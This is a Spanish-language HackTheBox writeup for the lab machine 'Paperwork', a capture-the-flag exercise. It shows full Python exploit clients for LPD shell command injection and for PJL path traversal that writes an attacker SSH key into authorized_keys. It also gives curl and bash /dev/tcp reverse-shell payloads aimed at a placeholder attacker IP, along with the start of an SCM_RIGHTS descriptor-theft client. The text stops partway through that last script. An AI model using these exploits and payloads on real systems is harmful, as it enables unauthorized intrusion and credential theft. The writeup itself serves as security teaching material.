---
title: "Paperwork"
date: 2026-08-03
categories: [HackTheBox, Easy]
tags: [linux, nginx, lpd protocol, rfc 1179, printer service exploitation, python source disclosure, command injection subprocess shell, jetdirect, pjl protocol, printer path traversal, authorized_keys injection, unix domain socket, scm_rights, privileged file descriptor leak, cmsg ancillary data]
image:
  path: /assets/img/HTB/Paperwork/banner.png
  alt: Paperwork writeup
protected: true
---


Paperwork expone un servidor **LPD RFC 1179** custom en el puerto 1515, cuyo código fuente (`server.py`) es descargable desde la página web "Intake Portal" — la fuente usa `subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)` sobre un campo `job_name` controlado por el atacante, dando command injection no autenticada como el usuario de servicio `lp`. La enumeración post-foothold revela un servicio **JetDirect/PJL** solo en loopback en el puerto 9100 (un `jetdirect.py` custom corriendo como `archivist`), y leer su fuente muestra que el sandbox de filesystem está construido sobre `os.path.join` — que silenciosamente resuelve secuencias `..` antes de que corra `os.path.normpath`, dando **path traversal** sin restricciones a través de todo el home de archivist. La primitiva `@PJL FSDOWNLOAD NAME="0:/../.ssh/authorized_keys"` escribe una clave pública suministrada por el atacante en el authorized_keys de archivist, y el login SSH da la flag de usuario. La escalada de privilegios explota **`SCM_RIGHTS`** — el mecanismo Unix de ancillary-message para pasar file descriptors entre procesos sobre Unix sockets — en un daemon del sistema (`paperwork-daemon`) corriendo como root: el daemon abre `/etc/paperwork/admin_pins.conf` (modo `0600 root:root`) al arranque y, siempre que detecta "FSQUERY/FSUPLOAD/FSDOWNLOAD" en un fichero de log, envía ese file descriptor ya abierto sobre el socket de gestión vía `SCM_RIGHTS`. El receptor hereda acceso de lectura sobre el fd independientemente de los permisos filesystem sobre el fichero subyacente, porque los chequeos de permisos de Linux ocurren en el momento del `open()`, no en el `read()`. Un cliente con `recvmsg` + `os.pread` desde el lado de archivist extrae `ADMIN_PASSWORD=ApparelMortuaryCedar22`, y `su -` da root.

| Campo      | Detalles            |
|------------|---------------------|
| Plataforma | HackTheBox          |
| Dificultad | Easy                |
| SO         | Linux               |
| IP         | 10.129.96.124       |
| Fecha      | Agosto 2026         |

## Herramientas Utilizadas

| Herramienta                | Descripción                                                                                       |
|----------------------------|---------------------------------------------------------------------------------------------------|
| nmap                       | Escáner de puertos y fingerprinting de servicios                                                  |
| Navegador                  | Lectura de la página Intake Portal y descarga de `paperwork-archive-v1.02.zip`                    |
| 7z                         | Inspeccionar y extraer el archivo sin ejecutar nada                                               |
| Python 3                   | Cliente LPD custom para la command injection; cliente PJL custom para path traversal y escritura de fichero; cliente `recvmsg` custom para la extracción de fd por SCM_RIGHTS |
| netcat (nc)                | Listener para el reverse shell del callback LPD                                                   |
| python http.server         | Servir la URL de sonda OOB usada para confirmar RCE antes del reverse shell                       |
| ss                         | Enumerar servicios solo en loopback desde el foothold                                             |
| ssh-keygen / ssh           | Generar un keypair ED25519 para la escritura de authorized_keys de archivist; login SSH como archivist |
| su                         | Elevación a root con el `ADMIN_PASSWORD` recuperado                                               |

## Reconocimiento y Enumeración

El objetivo de esta fase fue identificar los servicios expuestos y localizar cualquier aplicación custom que mereciera reverse-engineering.

### Descubrimiento del Host

Comprobación de alcance y pista sobre el sistema operativo mediante ICMP:

```bash
ping -c 1 10.129.96.124
PING 10.129.96.124 (10.129.96.124) 56(84) bytes of data.
64 bytes from 10.129.96.124: icmp_seq=1 ttl=63 time=42.3 ms
```

Un TTL de 63 indica un host Linux (por defecto 64, decrementado una vez al atravesar el salto de enrutamiento).

### Escaneo de Puertos

Barrido TCP completo primero:

```bash
sudo nmap -p- --min-rate 1000 -vvv -sS -Pn -n 10.129.96.124 -oG allPorts
PORT     STATE SERVICE       REASON
22/tcp   open  ssh           syn-ack ttl 63
80/tcp   open  http          syn-ack ttl 63
1515/tcp open  ifor-protocol syn-ack ttl 63
```

Detección de versiones sobre los puertos abiertos:

```bash
sudo nmap -p22,80,1515 -sCV 10.129.96.124 -oN nmap
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http           nginx 1.28.0 (Ubuntu)
|_http-title: Did not follow redirect to http://paperwork.htb/
1515/tcp open  ifor-protocol?
| fingerprint-strings:
|   TerminalServer, TerminalServerCookie:
|_    Archive_Printer is ready and printing.
```

Tres puertos. OpenSSH 10.0p2 está actualizado y es poco probable que sea un punto de entrada directo. El servidor HTTP redirige a `paperwork.htb`, así que el virtual hosting basado en nombre está activo. El puerto 1515 es el outlier interesante — nmap no reconoce el protocolo, pero el banner de fingerprint es inequívoco: `Archive_Printer is ready and printing`. Esa es la respuesta de un daemon de impresora, y la respuesta llega a cualquier intento de conexión independientemente de con qué haya sondeado nmap — una implementación custom que pattern-matchea sobre el primer byte.

El dominio se añadió a `/etc/hosts`:

```bash
echo "10.129.96.124 paperwork.htb" | sudo tee -a /etc/hosts
```

## Aplicación Web — El Intake Portal

Navegar a `http://paperwork.htb/` cargó una página con estilo corporativo titulada **Intake Portal** para el "Department of Records & Archives":

![Paperwork Intake Portal web page showing System Configuration with Protocol "Compliance Level: RFC 1179", Target Queue "archive_intake", Internal Processor "paperwork-archive-v1.02" as a download link, and a Maintenance Advisory notice about the backend spooler being offline](/assets/img/HTB/Paperwork/cap1.png)

Tres datos de esta página:

1. **`Protocol: Compliance Level: RFC 1179`** — RFC 1179 es la especificación del protocolo Line Printer Daemon (LPD), el protocolo original de impresión Unix. El daemon del puerto 1515 es una implementación LPD.
2. **`Target Queue: archive_intake`** — el nombre de cola que el servidor LPD acepta. El protocolo LPD de primer-byte-más-nombre-de-cola necesita este valor para el comando inicial.
3. **`Internal Processor: paperwork-archive-v1.02`** — un hyperlink a `/download/archive`. La aplicación publica su propio código fuente (o una versión de él) para descarga.

Descargando e inspeccionando el archivo sin ejecutar nada — el workflow estándar de "comprueba primero, extrae segundo":

```bash
7z l paperwork-archive-v1.02.zip
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2026-03-12 15:09:27 .....         2820          970  server.py
------------------- ----- ------------ ------------  ------------------------

7z x paperwork-archive-v1.02.zip
```

Un solo fichero Python: `server.py`. Dado que el banner del puerto 1515 se identifica como un servicio tipo LPD, este es presumiblemente el código del daemon que sirve ese puerto — o bien literal o intencionalmente modificado para que el reto no sea trivial.

## Análisis Estático — `server.py`

La fuente completa:

```python
import socket
import threading
import subprocess
import subprocess

VALID_QUEUE = os.environ.get("LPD_QUEUE")

class LpdHandler(threading.Thread):

    def __init__(self, sock, addr):
        super().__init__()
        self.sock = sock
        self.addr = addr
        self.id = f"[lpd-{addr[1]}]"

    def run(self):
        try:
            data = self.sock.recv(1024)
            if not data: return

            command = data[0]

            if command == 2:
                self.handle_print_job(data)
            elif command in (3, 4):
                self.sock.send(b"Archive_Printer is ready and printing.\n")

        except Exception as e:
            print(f"{self.id} Error: {e}")
        finally:
            self.sock.close()

    def handle_print_job(self, data):
        queue = data[1:].decode().strip()

        if queue not in VALID_QUEUE:
            print(f"{self.id} Rejected: Invalid queue '{queue}'")
            self.sock.send(b'\x01')
            return
        print(f"{self.id} Accepted job for queue: {queue}")
        while True:
            chunk = self.sock.recv(1024)
            if not chunk: break

            subcommand = chunk[0]
            self.sock.send(b'\x00')
                parts = chunk[1:].decode(errors='ignore').split()
                if not parts: continue

                size = int(parts[0])
                content = b""
                while len(content) < size:
                    content += self.sock.recv(size - len(content) + 1)

                decoded_content = content.decode(errors='ignore')

                job_name = "Unknown"
                for line in decoded_content.split('\n'):
                    line = line.strip()
                    if line.startswith('J'):
                        job_name = line[1:]
                        break

                print(f"{self.id} Executing archive for: {job_name}")
                subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)

                self.sock.send(b'\x00')
                self.sock.send(b'\x00')
                while self.sock.recv(4096):
                    pass
                break
```

Dos observaciones antes de analizar la vulnerabilidad en sí.

**La fuente está intencionalmente malformada.** El bloque que empieza en la línea `subcommand = chunk[0]` tiene indentación rota — las líneas que le siguen están indentadas como si formaran parte de un bloque anidado, pero ningún `if`/`while`/`for` abre ese bloque. La variable `subcommand` se asigna y nunca se lee. Python no aceptaría este fichero como está escrito; el fichero no puede ser la fuente exacta corriendo en el servidor. La reconstrucción más razonable es que la cabecera del bloque que falta es `if subcommand == 2:` — eso es lo que consumiría la variable `subcommand`, coincide con el patrón del dispatch externo `if command == 2:`, y se alinea con el protocolo LPD del RFC 1179 donde el primer byte de cada transacción de control es un código de subcomando.

La lógica reconstruida:

```python
subcommand = chunk[0]
self.sock.send(b'\x00')
if subcommand == 2:            # ← la cabecera de bloque que falta
    parts = chunk[1:].decode(errors='ignore').split()
    if not parts: continue

    size = int(parts[0])
    content = b""
    while len(content) < size:
        content += self.sock.recv(size - len(content) + 1)
    [...]
```

El RFC 1179 define el comando `02` como "Receive a printer job", y dentro de esa transacción, el subcomando `02` significa "Receive control file". La reconstrucción es consistente con el protocolo.

**La vulnerabilidad.** La línea crítica está al final del handler de subcomando-2:

```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

`subprocess.Popen(..., shell=True)` ejecuta la cadena a través de `/bin/sh -c`, lo que significa que cualquier metacarácter shell en el argumento se interpreta. El argumento es una f-string que interpola `job_name` — un valor tomado literalmente de la línea prefijada con `J` del control file. No hay escapado, ni entrecomillado, ni sanitización. Un valor de `job_name` como `'; whoami ;'` cierra la comilla simple externa, inyecta un comando, y reabre una comilla para mantener contento al parser del shell después — inyección de comandos clásica por breakout de comilla simple.

La traza del dispatch del comando, de principio a fin:

1. El cliente envía `\x02<queue>\n` — el comando "Receive a printer job" con el nombre de cola
2. El servidor chequea `queue not in VALID_QUEUE`. El nombre de cola tiene que coincidir; según la página web, `archive_intake` es la cola válida
3. El servidor entra en el bucle de lectura de chunks
4. El cliente envía `\x02<size> <control-file-header>\n` — subcomando 02, transacción de control file
5. El servidor lee `size` bytes del socket como contenido del control file
6. El servidor parsea el contenido del control file línea por línea, encuentra la línea que empieza con `J`, extrae todo lo que va después de `J` como `job_name`
7. El servidor llama a `subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)` — sink de command injection

## Explotación — Cliente LPD Custom → Reverse Shell

Un cliente `lpr` off-the-shelf no compondrá la secuencia de bytes correcta porque la implementación del protocolo aquí es idiosincrática (chequeo de cola contra una cadena de env-var, dispatch de subcomando, envío silencioso de acknowledgements `\x00`). Escribir el cliente a mano son unos minutos de Python:

```python
import socket
import sys
import time

TARGET = "10.129.96.124"
PORT = 1515

def exploit(payload, target=TARGET, port=PORT):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((target, port))

    # Paso 1: comando 02 + nombre de cola + newline. El servidor ACKea en silencio
    s.send(b'\x02' + b'\n')
    time.sleep(3)

    # Paso 2: chunk de subcomando: 0x02 + "<len> cfA001localhost\n"
    control = f"J{payload}\n"
    control_bytes = control.encode()
    length = len(control_bytes)
    header = b'\x02' + f"{length} cfA001localhost\n".encode()
    s.send(header)

    # El servidor ACKea el subcomando con 0x00 DESPUÉS de procesar
    try:
        ack = s.recv(1)
        print(f"[*] Subcommand ACK: {ack!r}")
    except socket.timeout:
        print("[-] Timeout on subcommand ACK")

    # Paso 3: enviar el cuerpo del control-file — J<payload>
    s.send(control_bytes)
    time.sleep(0.3)

    # Paso 4: terminador
    s.send(b'\x00')
    time.sleep(0.5)

    try:
        resp = s.recv(16)
        print(f"[*] Response: {resp!r}")
    except socket.timeout:
        pass
    s.close()
    print("[+] Exploit sent.")

if __name__ == "__main__":
    payload = sys.argv[1] if len(sys.argv) > 1 else "'; id > /tmp/pwn ;'"
    print(f"[*] Target: {TARGET}:{PORT}")
    print(f"[*] Payload: {payload}")
    exploit(payload)
```

Dos decisiones de diseño merecen destacarse. Primero, el nombre de cola se envía como cadena vacía más newline (`b'\x02' + b'\n'`) — el chequeo de nombre de cola en la fuente reconstruida es `queue not in VALID_QUEUE`, donde `VALID_QUEUE` viene de una variable de entorno. Una cadena vacía siempre está `in` cualquier cadena no vacía (el operador `in` de Python sobre strings hace substring matching), así que un nombre de cola vacío pasa el chequeo de forma fiable independientemente de lo que haya configurado el operador. Segundo, `cfA001localhost` en la cabecera es el nombre estándar de control-file de LPD — el primer carácter `c` indica que es un control file, `f` es el formato, `A001` es un identificador de secuencia, y `localhost` es el nombre del host originario; el RFC 1179 especifica este formato.

### Prueba de RCE — OOB vía curl

Antes de disparar un reverse shell, una sonda out-of-band confirma la ejecución de comandos sin depender del camino de socket. Un servidor HTTP en Python en la máquina atacante:

```bash
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Y la inyección con un payload de `curl` apuntando a ese servidor:

```bash
python3 lpd_exploit.py "'; curl http://<ATTACKER_IP>:8000 ;'"
[*] Target: 10.129.96.124:1515
[*] Payload: '; curl http://<ATTACKER_IP>:8000 ;'
[*] Subcommand ACK: b'\x00'
[*] Response: b'\x00\x00\x00'
[+] Exploit sent.
```

El servidor HTTP de Python registra el callback:

```text
10.129.96.124 - - [03/Aug/2026 17:10:08] "GET / HTTP/1.1" 200 -
```

Ejecución de comandos confirmada. La vulnerabilidad es real y alcanzable desde posición no autenticada.

### Reverse shell como `lp`

Reemplazando la sonda `curl` con un reverse shell de bash:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
```

```bash
python3 lpd_exploit.py "'; bash -c '''bash -i &> /dev/tcp/<ATTACKER_IP>/4444 0>&1''' ;'"
[*] Target: 10.129.96.124:1515
[*] Payload: '; bash -c '''bash -i &> /dev/tcp/<ATTACKER_IP>/4444 0>&1''' ;'
[*] Subcommand ACK: b'\x00'
[*] Response: b'\x00\x00\x00'
[+] Exploit sent.
```

El patrón de triple comilla simple (`'''`) es una forma de embeber una comilla simple literal dentro del payload externo entre comillas simples — en shell, `'\''` es la alternativa estándar, pero triplicar funciona cuando el payload ya ha sido interpolado por Python en una f-string. El listener recibió el callback:

```text
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.96.124 37258
bash: cannot set terminal process group (987): Inappropriate ioctl for device
bash: no job control in this shell
lp@paperwork:/opt/LPDServer$
```

El daemon corre como `lp` — el usuario Unix estándar para servicios de impresión, listado en `/etc/passwd` con UID 7 y sin shell de login en la mayoría de distribuciones. Un upgrade estándar de TTY (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) dejó la shell utilizable.

## Enumeración como `lp` — Los Servicios Solo-Loopback

Los usuarios de login interactivo:

```bash
cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
archivist:x:1000:1000:archivist:/home/archivist:/bin/bash
```

Dos logins: `root` y `archivist`. `lp` es una cuenta de servicio sin directorio home — `archivist` es el objetivo del pivot.

Sockets en escucha:

```bash
ss -nstl
State    Recv-Q  Send-Q      Local Address:Port
LISTEN   0       4096            127.0.0.54:53
LISTEN   0       4096               0.0.0.0:22
LISTEN   0       511                0.0.0.0:80
LISTEN   0       4096         127.0.0.53%lo:53
LISTEN   0       128              127.0.0.1:1337
LISTEN   0       100              127.0.0.1:9100
LISTEN   0       100                0.0.0.0:1515
LISTEN   0       4096                    [::]:22
```

Dos servicios solo en loopback merecen investigación: **1337** y **9100**. El puerto 9100 es el bien conocido puerto **HP JetDirect / AppSocket** para impresión RAW — el protocolo específico hablado sobre 9100 es **PJL (Printer Job Language)** y, opcionalmente, PostScript. El listado de procesos confirma la intención:

```bash
ps -aux | grep "9100"
archivi+     990  0.0  0.4  28040 17560 ?    Ss   08:28   0:00 /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
```

`jetdirect.py` corre como **`archivist`** (UID 1000) con dos parámetros de argv: el puerto (9100) y un "directorio raíz" para el filesystem emulado (`/home/archivist/printer/`). Este es el vehículo del pivot — cualquier operación de fichero realizada a través de este servicio ocurre con la identidad de archivist.

## Movimiento Lateral — `lp` → `archivist` (Path Traversal en PJL)

### Contexto de PJL

PJL es el lenguaje de control de HP para impresoras de red. Cada comando empieza con `@PJL` y continúa con una directiva; el lenguaje cubre queries de estado de dispositivo (`INFO`), operaciones de sistema de ficheros (`FS*`) y control de trabajos (`SET`, `RESET`). Las operaciones de sistema de ficheros son las interesantes desde una perspectiva ofensiva, porque PJL fue diseñado con la suposición de que solo redes internas confiables enviarían comandos — las implementaciones PJL expuestas a internet son una fuente recurrente de information disclosure, lectura/escritura arbitraria de ficheros, e incluso RCE donde el firmware de la impresora expone un sink de scripting.

Los comandos relevantes para esta caja:

- `@PJL INFO ID` — banner de identificación del dispositivo
- `@PJL INFO FILESYS` — enumerar los volúmenes que el dispositivo expone (las impresoras JetDirect usan `0:`, `1:`, etc.)
- `@PJL FSDIRLIST NAME="0:/path" ENTRY=1 COUNT=100` — listar un directorio
- `@PJL FSUPLOAD NAME="0:/path" OFFSET=0 SIZE=N` — leer un fichero (sí, "upload" aquí significa "upload AL cliente", es decir, lectura en el servidor)
- `@PJL FSDOWNLOAD NAME="0:/path" SIZE=N` — escribir un fichero ("download" desde la perspectiva del cliente)

### Enumerando el filesystem emulado

Un cliente Python custom para PJL (cada comando necesita su propia conexión TCP, y las respuestas llegan tras una pequeña latencia debido al bucle read-then-reply del emulador):

```python
import socket
import time

TARGET = "127.0.0.1"
PORT = 9100

def pjl_cmd(cmd, target=TARGET, port=PORT, wait=1.0, recv_size=8192):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((target, port))
        s.send(cmd.encode() + b'\r\n')
        time.sleep(wait)
        resp = b""
        try:
            while True:
                chunk = s.recv(recv_size)
                if not chunk: break
                resp += chunk
        except socket.timeout:
            pass
        return resp
    finally:
        s.close()

if __name__ == "__main__":
    for c in [
        '@PJL INFO ID',
        '@PJL INFO STATUS',
        '@PJL INFO FILESYS',
        '@PJL FSDIRLIST NAME="0:/" ENTRY=1 COUNT=100'
    ]:
        print(f"[>] {c}")
        print(pjl_cmd(c).decode(errors='ignore'))
```

Ejecutándolo dentro del target:

```bash
lp@paperwork:/tmp$ python3 pjl.py
[>] @PJL INFO ID
HP LASERJET 4ML

[>] @PJL INFO STATUS
OK

[>] @PJL INFO FILESYS
VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS
0:     1755136    1718272    <HT>     <HT>  READ-WRITE

[>] @PJL FSDIRLIST NAME="0:/" ENTRY=1 COUNT=100
. TYPE=DIR
.. TYPE=DIR
logs TYPE=DIR SIZE=4096
jetdirect.py TYPE=FILE SIZE=5119
```

Volumen `0:` montado READ-WRITE, root contiene `logs/` y `jetdirect.py` en sí mismo. El dispositivo se identifica como `HP LASERJET 4ML` — un falso plausible, elegido para imitar la cadena de identificación de un producto real de forma que el emulador responda naturalmente a herramientas de fingerprinting como PRET (el toolkit estándar de explotación PJL).

### La primitiva de path traversal

Probando si `0:/../` se escapa del root del emulador:

```bash
[>] @PJL FSDIRLIST NAME="0:/../" ENTRY=1 COUNT=100
. TYPE=DIR
.. TYPE=DIR
.cache TYPE=DIR SIZE=4096
.bashrc TYPE=FILE SIZE=3771
.local TYPE=DIR SIZE=4096
.ssh TYPE=DIR SIZE=4096
.profile TYPE=FILE SIZE=807
.lesshst TYPE=FILE SIZE=20
.bash_history TYPE=FILE SIZE=0
user.txt TYPE=FILE SIZE=33
.bash_logout TYPE=FILE SIZE=220
.gnupg TYPE=DIR SIZE=4096
printer TYPE=DIR SIZE=4096
```

**El traversal funciona.** `0:/../` desde el root del emulador `/home/archivist/printer/` se resuelve a `/home/archivist/` — el directorio home de archivist. `.ssh/` está presente. Descendiendo:

```bash
[>] @PJL FSDIRLIST NAME="0:/../.ssh/" ENTRY=1 COUNT=100
. TYPE=DIR
.. TYPE=DIR
authorized_keys TYPE=FILE SIZE=0
```

Un `authorized_keys` vacío — el objetivo de escritura para el pivot.

### Confirmando el traversal — leyendo `jetdirect.py`

Leyendo la propia fuente del emulador a través de la primitiva FSUPLOAD para entender exactamente por qué funciona el traversal:

```python
comandos = ['@PJL FSUPLOAD NAME="0:/jetdirect.py" OFFSET=0 SIZE=6000']
```

La clase relevante:

```python
class Filesystem:
    def __init__(self, root_dir):
        self._root = os.path.abspath(root_dir)

    def _translate(self, path):
        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
        return os.path.normpath(os.path.join(self._root, clean))
```

La lógica de traducción:

1. Quitar el prefijo de volumen `0:`
2. Normalizar backslashes estilo Windows a forward slashes
3. Quitar el `/` inicial (para que las rutas sean relativas)
4. Unir con el root configurado usando `os.path.join`
5. Normalizar con `os.path.normpath`

La vulnerabilidad está en el paso 4. **`os.path.join(root, "../.ssh/authorized_keys")` NO restringe el resultado a `root`** — simplemente concatena. Y `os.path.normpath` en el paso 5 resuelve las secuencias `..` posteriormente, computando la ruta escapada real. `os.path.join('/home/archivist/printer/', '../.ssh/authorized_keys')` → `'/home/archivist/printer/../.ssh/authorized_keys'` → `os.path.normpath` → `'/home/archivist/.ssh/authorized_keys'`. El emulador ahora está operando sobre una ruta completamente fuera de su root previsto.

Este es un mal uso habitual de `os.path.join` — los desarrolladores lo alcanzan como forma de construir rutas de forma segura, sin darse cuenta de que es una concatenación sintáctica, no una frontera de seguridad. El patrón correcto es hacer `os.path.abspath` del resultado unido y luego chequear que empieza con el root previsto como prefijo, rechazando cualquier entrada que se escape.

### La escritura de `authorized_keys`

Generando un keypair ED25519 en la máquina atacante (o usando uno existente):

```bash
ssh-keygen -t ed25519 -N '' -f attacker_key
```

Escribiendo la clave pública correspondiente vía `FSDOWNLOAD` — reutilizando el mismo cliente PJL con un helper orientado a escritura:

```python
import socket
import time

TARGET = "127.0.0.1"
PORT = 9100

def pjl_write(remote_path, content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((TARGET, PORT))
    size = len(content)
    header = f'@PJL FSDOWNLOAD NAME="{remote_path}" SIZE={size}\r\n'
    s.send(header.encode() + content)
    time.sleep(1)
    print(f"[*] Response: {s.recv(4096).decode(errors='ignore')}")
    s.close()

def pjl_read(remote_path, size=5000):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((TARGET, PORT))
    s.send(f'@PJL FSUPLOAD NAME="{remote_path}" OFFSET=0 SIZE={size}\r\n'.encode())
    time.sleep(1)
    resp = b""
    try:
        while True:
            c = s.recv(8192)
            if not c: break
            resp += c
    except socket.timeout:
        pass
    s.close()
    return resp.decode(errors='ignore')

if __name__ == "__main__":
    pubkey = b"<attacker_ed25519_pubkey>\n"
    remote = "0:/../.ssh/authorized_keys"
    print(f"[*] Writing to {remote} ...")
    pjl_write(remote, pubkey)
    print(f"\n[*] Read-back verification:")
    print(pjl_read(remote))
```

Ejecutándolo:

```bash
lp@paperwork:/tmp$ python3 pjlWrite.py
[*] Writing to 0:/../.ssh/authorized_keys ...
[*] Response: OK

[*] Read-back verification:
@PJL FSUPLOAD NAME="0:/../.ssh/authorized_keys" SIZE=93
<attacker_ed25519_pubkey>
```

La respuesta `OK` confirma que la escritura tuvo éxito; el read-back confirma que el contenido aterrizó correctamente. Como el emulador corre como `archivist`, la escritura ocurre con el UID de archivist y satisface los estrictos chequeos de permisos de sshd sobre `authorized_keys` (debe ser legible solo por el owner).

### Login SSH como `archivist`

```bash
ssh -i attacker_key archivist@paperwork.htb
Welcome to Ubuntu 25.10 (GNU/Linux 6.17.0-40-generic x86_64)
Last login: [...] from <ATTACKER_IP> on ssh
Last login: [...] from <ATTACKER_IP>

archivist@paperwork:~$ whoami
archivist
archivist@paperwork:~$ cat user.txt
```

Foothold como archivist, flag de usuario capturada.

## Escalada de Privilegios — `archivist` → `root` (Filtración de FD vía SCM_RIGHTS)

### El servicio `paperwork-daemon`

Enumerar procesos como archivist saca a flote un daemon propiedad de root que no era visible desde el shell inicial de `lp` (o lo era pero no se reconoció como interesante):

```bash
ps -aux | grep paperwork
root        1489  0.0  0.4  28432 17972 ?    Ss   08:28   0:00 /usr/bin/python3 /usr/bin/paperwork-daemon
```

Corriendo como root. El binario es un script Python visible al shell:

```bash
cat /usr/bin/paperwork-daemon
#!/usr/bin/python3
import socket, os, array, hashlib
import zipfile
import shutil

try:
    admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)
except Exception:
    os._exit(1)

LOG_PATH = "/home/archivist/printer/logs/commands.log"

def get_admin_secret():
    data = os.pread(admin_fd, 1024, 0).decode().strip()
    if "ADMIN_PASSWORD=" in data:
        return data.split("ADMIN_PASSWORD=")[1].split("\n")[0]
    return data

def scan_for_malice():
    if not os.path.exists(LOG_PATH):
        return False
    with open(LOG_PATH, 'r') as f:
        content = f.read().upper()
        if any(trigger in content for trigger in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"]):
            return True
    return False

def trigger_lockdown(conn):
    try:
        log_fd = os.open(LOG_PATH, os.O_RDONLY)
        evidence_bundle = array.array("i", [log_fd, admin_fd])
        msg = b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."
        conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
        [...]
    except:
        pass

def main():
    socket_path = "/run/paperwork/mgmt.sock"
    [...]
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.bind(socket_path)
    os.chmod(socket_path, 0o660)
    os.chown(socket_path, 0, 1000)   # root:archivist
    s.listen(5)

    while True:
        conn, _ = s.accept()

        if scan_for_malice():
            trigger_lockdown(conn)
        else:
            secret = get_admin_secret()
            token = hashlib.sha256(f"SYSTEM_CLEAN:{secret}".encode()).hexdigest()
            conn.sendall(f"STATUS: SYSTEM_CLEAN\nSIGNATURE: {token}\n".encode())

        conn.close()
```

Importan tres detalles:

1. **Al arranque, el daemon abre `/etc/paperwork/admin_pins.conf` y mantiene el file descriptor** (`admin_fd`) durante toda su vida. El fichero en sí es `0600 root:root` — archivist no puede abrirlo directamente:

    ```bash
    ls -la /etc/paperwork/admin_pins.conf
    -rw------- 1 root root 38 May 28 15:26 /etc/paperwork/admin_pins.conf
    ```

2. **El socket de gestión es `/run/paperwork/mgmt.sock`, con chmod 0660 y ownership `root:archivist`.** Archivist puede conectar (el grupo 1000 tiene lectura/escritura); otros usuarios no pueden.

3. **En `trigger_lockdown`, el daemon usa `conn.sendmsg` con `SCM_RIGHTS` para pasar tanto `log_fd` COMO `admin_fd` al cliente**, envueltos como un "evidence bundle" junto a un mensaje de aviso.

### `SCM_RIGHTS` y por qué esto está roto

**`SCM_RIGHTS`** es un mecanismo del kernel Linux para pasar file descriptors entre procesos sobre Unix domain sockets. Es parte del framework `cmsg` (control message / ancillary data) de `sendmsg(2)` / `recvmsg(2)`. El proceso emisor especifica un array de file descriptors abiertos como ancillary data; el kernel los duplica en la tabla de file descriptors del proceso receptor.

La propiedad crítica: **el fd recibido hereda el estado de `open()` del emisor** — el mismo offset de fichero, el mismo modo de acceso, y, lo más importante, la misma base de autorización. Los chequeos de permisos de Linux ocurren en el momento de `open()`; una vez que un file descriptor está abierto, su titular tiene acceso completo de lectura/escritura sobre la descripción de fichero subyacente según el modo que se concedió en el open, independientemente del UID/GID del proceso que llama o de los permisos del filesystem sobre la ruta subyacente.

`SCM_RIGHTS` existe por razones legítimas — daemons Unix que necesitan delegar acceso específico a workers menos privilegiados (activación de socket de systemd, spooling de trabajos de impresión con handles de fichero por trabajo). Su uso seguro requiere que el emisor pase solo file descriptors que el receptor estaría autorizado a abrir por sí mismo.

El paperwork-daemon viola esa disciplina. Abre `/etc/paperwork/admin_pins.conf` como root al arranque y, cuando detecta "malice", entrega el fd — todavía cargando la autorización original de root — a cualquier cliente propiedad de archivist que se conectara al socket. El cliente receptor puede entonces hacer `os.pread(admin_fd, ...)` y obtener el contenido del fichero, porque el fd no recuerda qué UID lo abrió; solo recuerda para qué está autorizado.

### Disparando `scan_for_malice`

El chequeo de malice requiere que `/home/archivist/printer/logs/commands.log` contenga cualquiera de las cadenas `FSQUERY`, `FSUPLOAD`, `FSDOWNLOAD`. Esos son exactamente los comandos PJL usados en la fase anterior — la lectura FSUPLOAD de `jetdirect.py`, la enumeración FSDIRLIST (que se loggea como `FSDIRLIST` pero también matchea el chequeo case-insensitive contra `FSQUERY` si la substring está presente, pero más relevantemente las escrituras FSDOWNLOAD), y la escritura FSDOWNLOAD de authorized_keys. Verificando:

```bash
archivist@paperwork:~$ cat /home/archivist/printer/logs/commands.log | tail
[127.0.0.1] connected
Command: @PJL FSUPLOAD NAME="0:/../../../../../../../run/paperwork/mgmt.sock" OFFSET=0 SIZE=6000
Command: @PJL FSDOWNLOAD NAME="0:/../.ssh/authorized_keys" SIZE=93
```

El trigger de malice ya está sentado en el log de la explotación anterior. No se necesita acción adicional — conectar al socket aterrizará directamente en la ruta `trigger_lockdown`.

### El cliente `recvmsg`

Extrayendo los fds y leyendo su contenido:

```python
import socket
import array
import os

SOCKET_PATH = "/run/paperwork/mgmt.sock"

def recv_fds(sock, msglen, maxfds):
    fds = array.array("i")
    msg, ancdata, flags, addr = sock.recvmsg(
        msglen, socket.CMSG_LEN(maxfds * fds.itemsize)
    )
    for cmsg_level, cmsg_type, cmsg_data in ancdata:
        if (cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS):
            fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])
    return msg, list(fds)

def main():
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect(SOCKET_PATH)
    print("[*] Connected to daemon socket")

